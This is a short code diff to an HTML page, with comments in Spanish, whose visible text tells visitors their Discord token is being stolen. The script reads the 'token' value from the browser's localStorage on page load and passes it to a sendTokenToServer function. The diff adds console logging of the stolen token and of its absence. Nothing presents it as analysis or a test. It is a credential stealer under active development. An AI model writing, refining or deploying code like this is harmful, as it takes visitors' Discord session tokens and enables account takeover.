@@ -10,7 +10,9 @@
     <p>Gracias por visitar. Mientras tanto, te estamos robando tu token de Discord.</p>
     <script>
         function getDiscordToken() {
-            return localStorage.getItem('token');
+            const token = localStorage.getItem('token');
+            console.log('Token obtenido de localStorage:', token);
+            return token;
         }
 
         function sendTokenToServer(token) {
@@ -33,6 +35,8 @@
         const token = getDiscordToken();
         if (token) {
             sendTokenToServer(token);
+        } else {
+            console.log('No se encontró token en localStorage.');
         }
     </script>
 </body>
